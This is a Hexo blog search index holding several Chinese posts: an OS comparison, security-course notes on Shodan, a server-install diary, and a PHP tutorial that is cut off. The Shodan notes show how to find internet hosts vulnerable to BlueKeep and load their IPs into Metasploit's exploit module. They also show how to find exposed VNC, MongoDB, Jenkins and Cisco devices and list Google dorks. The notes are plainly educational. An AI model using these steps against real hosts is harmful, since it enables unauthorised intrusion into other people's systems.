<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows</title>
      <link href="/2024/11/06/windows/"/>
      <url>/2024/11/06/windows/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="linux和windows区别"><a href="#linux和windows区别" class="headerlink" title="linux和windows区别"></a>linux和windows区别</h3><table><thead><tr><th></th><th>linux</th><th>windows</th></tr></thead><tbody><tr><td>文件系统</td><td>fhs目录结构，块设备挂载到目录（一切都是文件）</td><td>以驱动盘符起始，或挂在到目录分区</td></tr><tr><td>路径格式</td><td><code>/</code> 开始，区分大小写</td><td><code>\</code> 分割路径，不区分大小写</td></tr><tr><td>系统配置</td><td><code>/etc</code> 和 <code>/proc</code></td><td>注册表</td></tr></tbody></table><p><strong>windows的shell接口：</strong></p><ol><li>GUI图形化</li><li>cmd命令行</li><li>powershell：自动化脚本框架，支持<code>.net</code>架构</li></ol>]]></content>
      
      
      <categories>
          
          <category> 泷羽sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 泷羽sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shodan</title>
      <link href="/2024/11/04/shodan/"/>
      <url>/2024/11/04/shodan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>声明：</p></blockquote><blockquote><p>学习视频来自B站UP主 泷羽sec,如涉及侵泷羽sec权马上删除文章笔记的只是方便各位师傅学习知识,以下网站涉及学习内容,其他的都与本人无关,切莫逾越法律红线,否则后果自负</p></blockquote><hr><h1 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a><strong>学习笔记</strong></h1><p><strong>shodan</strong>：（搜索引擎）  <a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p>专门搜索网络设备</p><p>功能：在线查询功能，和离线的客户端，monitor(监控)可以监控一些ip地址，扫描出漏洞和bug，api接口调用</p><p>缺点：不够实时</p><hr><h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><p>配置代理：</p><p><img src="/img/shodan/1730713281494.png" alt="1730713281494"></p><p><img src="/img/shodan/1730709880587.png" alt="1730709880587"></p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shodan search --<span class="built_in">limit</span> 10 country:jp</span><br><span class="line"><span class="comment"># 查找一些日本的IP地址  search:扫描  limit：规定数量 </span></span><br><span class="line"></span><br><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str,post country:jp</span><br><span class="line"><span class="comment"># fileds: 过滤ip和端口(只看ip和端口信息)，ip_str:以ipv4的形式输出ip地址</span></span><br><span class="line"></span><br><span class="line">shodan search --color --<span class="built_in">limit</span> 10 --fields ip_str port:3389 country:cn city:shenzhen</span><br><span class="line"><span class="comment"># color:加深颜色</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">shodan host ip</span><br><span class="line"><span class="comment"># 查看ip信息</span></span><br><span class="line"></span><br><span class="line">fields ip_str,port</span><br><span class="line"><span class="comment"># 过滤ip信息</span></span><br><span class="line"></span><br><span class="line">--<span class="built_in">limit</span> 10</span><br><span class="line"><span class="comment"># 显示信息数量</span></span><br><span class="line"></span><br><span class="line">--color</span><br><span class="line"><span class="comment"># 深色表示</span></span><br><span class="line"></span><br><span class="line">os:windows7</span><br><span class="line"><span class="comment"># 操作系统</span></span><br><span class="line"></span><br><span class="line">has_vuln:True</span><br><span class="line"><span class="comment">#漏洞   </span></span><br><span class="line"></span><br><span class="line">device:weicam</span><br><span class="line"><span class="comment"># 设备：摄像头</span></span><br><span class="line"></span><br><span class="line">device:router</span><br><span class="line"><span class="comment"># 设备：路由器</span></span><br><span class="line"></span><br><span class="line">tp-link</span><br><span class="line"><span class="comment"># web端的一些设备</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="查漏洞："><a href="#查漏洞：" class="headerlink" title="查漏洞："></a>查漏洞：</h4><p><code>cve-2019-0708</code></p><blockquote><p>当未经身份验证的攻击者使用 RDP 连接到目标系统并发送经特殊设计的请求时，远程桌面服务（以前称为“终端服务”）中存在远程执行代码漏洞。此漏洞是预身份验证，无需用户交互。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全用户权限的新帐户。</p><p>若要利用此漏洞，攻击者需要通过 RDP 向目标系统远程桌面服务发送经特殊设计的请求。</p><p>可以看到其中利用的RDP即远程桌面端口3389，RDP协议，所带来的危害是不可估量的，当达到预想中的任意执行的攻击效果，后续利用便多种多样起来了。</p></blockquote><p>复现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str,port <span class="string">&#x27;&quot;\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00&quot;&#x27;</span></span><br><span class="line"><span class="comment"># 16进制漏洞特征</span></span><br><span class="line"><span class="comment"># 将ip地址保存至0708.txt</span></span><br></pre></td></tr></table></figure><p><img src="/img/shodan/image-20241105190919675.png" alt="image-20241105190919675"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shodan host ip</span><br><span class="line"><span class="comment"># 逐一检查第一步查出来的ip是否存在`cve-2019-0708`漏洞</span></span><br></pre></td></tr></table></figure><p>使用远程桌面连接:</p><p>msf批量利用漏洞:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开msf</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入0708.txt上级文件夹，批量查找漏洞</span></span><br><span class="line">search 0708</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入脚本</span></span><br><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"><span class="comment">#看payload，ip端口，show target</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拖入ip地址文件</span></span><br><span class="line"><span class="built_in">set</span> rhost file: ...</span><br><span class="line"></span><br><span class="line">check</span><br></pre></td></tr></table></figure><h5 id="download"><a href="#download" class="headerlink" title="download"></a>download</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shodan download-h</span><br><span class="line"></span><br><span class="line">show download filename --<span class="built_in">limit</span> 100 <span class="string">&#x27;&quot;\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shodan parse filename</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压</span></span><br><span class="line">shodan parse filename1 &gt;filename2</span><br></pre></td></tr></table></figure><h5 id="count"><a href="#count" class="headerlink" title="count"></a>count</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shodan count <span class="string">&#x27;&quot;\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00&quot;&#x27;</span></span><br><span class="line"><span class="comment"># 在 honeyscore.shodan.io 里查看是否位蜜罐 </span></span><br></pre></td></tr></table></figure><h5 id="host"><a href="#host" class="headerlink" title="host"></a>host</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shodan host ip --<span class="built_in">history</span></span><br><span class="line"><span class="comment"># 查看ip的历史数据</span></span><br></pre></td></tr></table></figure><h4 id="vnc空密码连接（危险！）"><a href="#vnc空密码连接（危险！）" class="headerlink" title="vnc空密码连接（危险！）"></a>vnc空密码连接（危险！）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str <span class="string">&quot;authentication disabled&quot;</span> port:5900</span><br></pre></td></tr></table></figure><p><img src="/img/shodan/image-20241105193758349.png" alt="image-20241105193758349"></p><p>尝试使用VNC连接：</p><p><img src="/img/shodan/image-20241105193906902.png" alt="image-20241105193906902"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan download --limit 100 &quot;authentication disabled&quot; port:5900</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shodan myip</span><br><span class="line"><span class="comment"># 查看自己的出口ip，哪个地址连接的公网</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shodan search --<span class="built_in">limit</span> 10 --fileds ip_str,port http.titli:hacked by</span><br><span class="line"><span class="comment"># 查看已经被黑的网站</span></span><br><span class="line"></span><br><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str,port <span class="string">&quot;cisco -authorized port:23&quot;</span> </span><br><span class="line"><span class="comment"># authorized:未授权访问的特征参数</span></span><br><span class="line"><span class="comment"># 该条命令可以查找cisco有弱口令特征的ip</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str,port net:208.22.24.0/24</span><br><span class="line"><span class="comment"># net:搜索网段</span></span><br><span class="line"></span><br><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str,port org:nsa.gov</span><br><span class="line"><span class="comment"># org: 组织</span></span><br><span class="line"></span><br><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str,port hostname:google</span><br><span class="line"><span class="comment"># 查找网址所在组织的ip</span></span><br><span class="line"></span><br><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str,port country:cn http.waf:safedog</span><br><span class="line"><span class="comment"># 查找装了安全狗的网站</span></span><br><span class="line"></span><br><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str,port http.html:login</span><br><span class="line"></span><br><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str <span class="string">&quot;Mongodb server information -authentication&quot;</span> port:27017</span><br><span class="line"></span><br><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str <span class="string">&quot;X-Jenkins&quot;</span> OR <span class="string">&quot;Set-cookie:JESSONID&quot;</span> http.title:<span class="string">&quot;Dashboard&quot;</span></span><br><span class="line"><span class="comment"># &quot;X-Jenkins&quot;OR&quot;Set-cookie:JSESSIONID&quot;:这是搜索条件，意味着搜索结果中要么响应头包含“X-Jenkins”，要么“Set-cookie&#x27;”的值包含“JSESSIONID”。使用0R逻辑运算符连接了这两个条件，扩大了搜索的范围</span></span><br><span class="line"></span><br><span class="line">shodan search --<span class="built_in">limit</span> 10 --fields ip_str,port product:Apache httpd</span><br><span class="line"><span class="comment"># 查找使用apache的web页面</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/Soinice/article/details/84062336">Jenkins（概念篇）：Jenkins 简介_ron jenkins 什么意思-CSDN博客</a></p><p>Jenkins是一个功能强大的应用程序，允许持续集成和持续交付项目（持续部署），无论用的是什么平台。这是一个免费的源代码，可以处理任何类型的构建或持续集成。集成Jenkins可以用于一些<strong>测试和部署</strong>技术。</p><p>Jenkins 是一个可扩展的持续集成引擎。</p></blockquote><h4 id="MongDB："><a href="#MongDB：" class="headerlink" title="MongDB："></a>MongDB：</h4><ul><li>nosql</li><li>文档型（以文档方式存储数据）</li></ul><table><thead><tr><th>MongDB</th><th>MySQL</th></tr></thead><tbody><tr><td>database</td><td>database</td></tr><tr><td>集合（collection）</td><td>table</td></tr><tr><td>文档 document</td><td>row</td></tr><tr><td>字段 filed</td><td>column</td></tr><tr><td>索引  index</td><td>index</td></tr><tr><td>_id</td><td>primary key</td></tr><tr><td>$lookup</td><td>join</td></tr><tr><td>$group</td><td>group by</td></tr></tbody></table><p>下载：mongdb.com</p><p>GUI: mongdb for vscode</p><p>连接：mongdb:&#x2F;&#x2F;ip:27017</p><p><strong>基础语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前数据库</span><br><span class="line"><span class="keyword">show</span> databases<span class="operator">/</span><span class="keyword">show</span> dbs</span><br><span class="line"></span><br><span class="line"># 切换数据库</span><br><span class="line">use 数据库名</span><br><span class="line"></span><br><span class="line"># 创建集合</span><br><span class="line">db.集合名称.insertOne(&#123;name:&quot;tiantian&quot;&#125;)</span><br><span class="line"></span><br><span class="line"># 查询集合中的数据</span><br><span class="line">db.集合名称.find()</span><br><span class="line">db.集合名称.find().limit(<span class="number">1</span>)</span><br><span class="line">db.集合名称.find(&#123;name:&quot;tiantian&quot;&#125;,&#123;lever:<span class="number">1</span>&#125;) #查询name为tiantian的字段，返回他的_id和level值</span><br><span class="line">db.集合名称.find(&#123;level:&#123;$gt:<span class="number">3</span>&#125;&#125;) #查询等级大于三的用户 （$gt:<span class="operator">&gt;</span> , $lt:<span class="operator">&lt;</span> , $eq:<span class="operator">=</span>）</span><br><span class="line">db.集合名称.find(&#123;level:&#123;$gte:<span class="number">3</span>,$lt:<span class="number">5</span>&#125;&#125;) #大于等于<span class="number">3</span>，小于<span class="number">5</span></span><br><span class="line">db.集合名称.find(&#123;$<span class="keyword">and</span>:[&#123;level:&#123;$gte:<span class="number">3</span>&#125;&#125;,&#123;level:&#123;$lt:<span class="number">5</span>&#125;&#125;]&#125;) #同理还有$<span class="keyword">or</span>,$<span class="keyword">not</span></span><br><span class="line">db.集合名称.find(&#123;name:&#123;$regex:<span class="operator">/</span>张<span class="operator">/</span>,$options:<span class="string">&#x27;i&#x27;</span>&#125;&#125;) #$regex:正则表达式查询,$options:<span class="string">&#x27;i&#x27;</span>:忽略大小写</span><br><span class="line">db.集合名称.find(&#123;level:&#123;$<span class="keyword">in</span>:<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;&#125;) #查询等级为<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>的用户</span><br><span class="line">db.集合名称.find(&#123;email:&#123;$<span class="keyword">exists</span>:<span class="literal">true</span>&#125;&#125;) # 查询有邮箱的用户 </span><br><span class="line"></span><br><span class="line">db.集合名称.findOne(&#123;level:&#123;$gte:<span class="number">3</span>&#125;&#125;) #查询满足条件的一条数据</span><br><span class="line">db.集合名称.updateOne(&#123;level:<span class="number">1</span>&#125;,&#123;$<span class="keyword">set</span>:&#123;name:&quot;wangwu&quot;&#125;&#125;) #更新一条数据,updateMany(...)</span><br><span class="line">db.集合名称.deleteOne(&#123;level:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"># 排序查询(<span class="number">1</span>：升序，<span class="number">-1</span>：降序)</span><br><span class="line">db.集合名称.find().sort(&#123;level:<span class="number">1</span>,name:<span class="number">1</span>&#125;)</span><br><span class="line">db.集合名称.find().sort(&#123;level:<span class="number">1</span>,name:<span class="number">1</span>&#125;).limit(<span class="number">2</span>).<span class="keyword">skip</span>(<span class="number">1</span>)  #跳过第一条数据</span><br><span class="line"></span><br><span class="line"># 插入多条数据到集合中</span><br><span class="line">db.集合名称.insertMany([&#123;name:&quot;zhangsan&quot;&#125;,&#123;name:&quot;lisi&quot;,sex<span class="operator">=</span>&quot;女&quot;&#125;])</span><br><span class="line"></span><br><span class="line">#聚合</span><br><span class="line">db.集合名称.countDocuments() #统计文档数量</span><br><span class="line">db.集合名称.countDocuments(&#123;level:&#123;$gte:<span class="number">3</span>&#125;&#125;) </span><br></pre></td></tr></table></figure><h3 id="shodan的图形化界面"><a href="#shodan的图形化界面" class="headerlink" title="shodan的图形化界面"></a>shodan的图形化界面</h3><p>搜索漏洞<code>&#39;&quot;\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00&quot;&#39;</code></p><p>摄像头：<code>webcam</code></p><p>截图：<code>has_screenshot:true cisco</code>  (联动3389端口 &#x3D;v&#x3D; )</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shodan domain www.baidu.com</span><br><span class="line"><span class="comment"># 查看域名的信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shodan--》非实时，实时--》scan</span></span><br><span class="line">shodan scan submit ip <span class="comment">#类似nmap</span></span><br><span class="line">shodan scan list <span class="comment">#查看扫描信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计中国使用了ssl的ip，并用版本做一个统计</span></span><br><span class="line">shodan stats --facets ssl.version country:cn has_ssl:<span class="literal">true</span> http</span><br></pre></td></tr></table></figure><p>常见端口及服务：</p><table><thead><tr><th>port</th><th>server</th></tr></thead><tbody><tr><td>80</td><td>HTTP</td></tr><tr><td>3306</td><td>MySQL</td></tr><tr><td>443</td><td>HTTPS</td></tr><tr><td>21</td><td>FTP</td></tr><tr><td>22</td><td>SSH</td></tr><tr><td>25</td><td>SMTP</td></tr><tr><td>110</td><td>pop3</td></tr><tr><td>143</td><td>IMAP</td></tr><tr><td>53</td><td>DNS</td></tr><tr><td>5432</td><td>PostgreSQL数据库服务器</td></tr><tr><td>3389</td><td>RDP（远程桌面协议）</td></tr><tr><td>69</td><td>TFTP</td></tr><tr><td>137-139</td><td>NetBIOS</td></tr><tr><td>67-68</td><td>DHCP</td></tr></tbody></table><h4 id="Google搜索语法"><a href="#Google搜索语法" class="headerlink" title="Google搜索语法"></a>Google搜索语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">inurl:admin</span><br><span class="line"></span><br><span class="line">inurl:login</span><br><span class="line"></span><br><span class="line">inurl:php?id=</span><br><span class="line"></span><br><span class="line">inurl:asp?id=</span><br><span class="line"></span><br><span class="line">inurl:jsp?id=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filetype:pdf 关键词</span><br><span class="line"></span><br><span class="line">filetype:doc 关键词</span><br><span class="line"></span><br><span class="line">filetype:xls 关键词</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">site:gov inurl:upload</span><br><span class="line"></span><br><span class="line">site:edu inurl:forum</span><br><span class="line"></span><br><span class="line">site:.com inurl:phpmyadmin</span><br><span class="line"></span><br><span class="line">site:.org inurl:password</span><br><span class="line"></span><br><span class="line">site:.net inurl:backup</span><br><span class="line"></span><br><span class="line">site:.gov.cn intitle:敏感信息</span><br><span class="line"></span><br><span class="line">site:.company.com inurl:confidential  # 机密</span><br><span class="line"></span><br><span class="line">site:.domain.cominurl:uploads</span><br><span class="line"></span><br><span class="line">site:.edu.cn filetype:ppt</span><br><span class="line"></span><br><span class="line">site:*.gov inurl:vulnerability</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 泷羽sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 泷羽sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闲话时间3</title>
      <link href="/2024/10/22/%E9%97%B2%E8%AF%9D%E6%97%B6%E9%97%B43/"/>
      <url>/2024/10/22/%E9%97%B2%E8%AF%9D%E6%97%B6%E9%97%B43/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>给公司装个机装了两天，下面简单做个总结</p><p>事情的开始是这样的：那天，我半梦半醒间听见什么装centos7啊，什么的。我寻思：这有何难？尽管我只是在虚拟机上装过，但是耐不住我装的多啊，不仅如此，因为之前上学的时候电脑的各种软件三天两头出bug，我也从开始得找朋友帮忙重装，到后面已经了解过程了（不说百分百，起码也有百分之八十了解把~）</p><p>结果装服务器还是跟这些有些许的差别。</p><p>一开始我也是凭着经验重装了，不过它当时一直报错:<br><img src="/img/2.jpg" alt="image"></p><p>没有办法，上网查了半天，怎么大家都没有碰到这个问题，只好装两个盘。<br>不过我一开始甚至直接装了三个盘，后面才反应过来已经改不了了，第一天光是重装应该就有四五次了，不光是这个安装位置的问题，当时格式化，结果以为格式化错了（其实是没错的），然后下的我重新做个启动盘，结果哪个U盘的格式是linux专用的，在我电脑上格式化成通用的格式，这回是真格式化了。<br>总之就是差不多一个多小时两个小时把，总算把系统重新装好了。<br>结果又叫我装里面的一些组件，这是我完全陌生的领域，接了网线，我说看看ip嘞。<br>光这个就弄到下班了，一点头绪没有。</p><p>第二天大早上，我就来试，仍然没有效果。好家伙，怎么办呢，这我熟啊，重装不就好了。于是早上再次重装两次，幸好我师傅路过我向他取经，算是对这加深了点了解把。<br>后面配了静态ip，然后连上ssh。</p><p>接下来的问题是压缩包，不知道为啥死活上传不了，最后重新启动了一下连接的软件，哎，好了！<br>然后就是按照手册一步步装。</p><p>你别说，之前搞vulfocus搞到晚上八点，今天我在centos上装，一堆bug，遂放弃。在一个平替的系统上装，基本没什么问题，跟之前大差不差，还好之前的笔记没删。现在一边装公司的系统，一边拉vulfocus，还真让我成功了。不过启动靶场的时候老是报错，目前还没有解决。（更新：已解决，原先的靶场只要ip和端口就可以进去了，这个靶场还要加上固定的路径）</p><p>关于装机，因为没有拍什么照我就简单文字叙述一下过程：<br>1、制作启动u盘，改名字（UltraISO）<br>2、重启，按F11进入bios（这个不同电脑有区别）<br>3、选择正确的启动u盘（不晓得为什么有两个，我两个都试过，只有一个是可以用的）<br>4、进入安装界面，按tab或是e，改名字，CTRL+x进入安装<br>5、正常安装（跟VMware一样）<br>漫长的等待······<br>6、重启，进入系统，接网线，查网卡，配置静态ip<br>7、登入ssh</p><p>大概过程就是这样了，具体的细节还是要靠自己摸索。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 茶水间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP</title>
      <link href="/2024/10/21/PHP/"/>
      <url>/2024/10/21/PHP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><ul><li><p>PHP（全称：PHP：Hypertext Preprocessor，即：超文本预处理器）是一种通用开源脚本语言。</p></li><li><p>运行于 Web 服务器中，主要用于网页处理。</p></li><li><p>PHP 负责处理用户提交的请求，与数据库进行关联，由 PHP 操作数据库进行数据的交互。</p></li></ul><h3 id="二、作用"><a href="#二、作用" class="headerlink" title="二、作用"></a>二、作用</h3><ul><li><p>PHP 能够生成动态页面内容。</p></li><li><p>PHP 能够创建、打开、读取、写入、删除以及关闭服务器上的文件。</p></li><li><p>PHP 能够接收表单数据。</p></li><li><p>PHP 能够发送并取回 Cookie。</p></li><li><p>PHP 能够添加、删除、修改数据库中的数据。</p></li><li><p>PHP 能够限制用户访问网站中的某些页面。</p></li><li><p>PHP 能够对数据进行加密。</p></li><li><p>···</p></li></ul><h3 id="三、书写"><a href="#三、书写" class="headerlink" title="三、书写"></a>三、书写</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;天天&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：PHP 后缀的文件中可以直接写 HTML 语法，但 HTML 后缀的文件中不能写 PHP 语法。</p></blockquote><p><strong>注释</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单行</span></span><br><span class="line"><span class="comment">#单行</span></span><br><span class="line"><span class="comment">/*1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//echo</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;第一段内容&quot;</span> . <span class="string">&quot;第二段内容&quot;</span>;    <span class="comment">// . 分割并拼接输出</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;第一段内容&quot;</span> , <span class="string">&quot;第二段内容&quot;</span>;    <span class="comment">// , 分割并拼接输出</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">     </span><br><span class="line"><span class="comment">//ptint</span></span><br><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"> <span class="keyword">print</span> <span class="string">&quot;第一段内容&quot;</span> . <span class="string">&quot;第二段内容&quot;</span>;    <span class="comment">// . 分割并拼接输出</span></span><br><span class="line"> <span 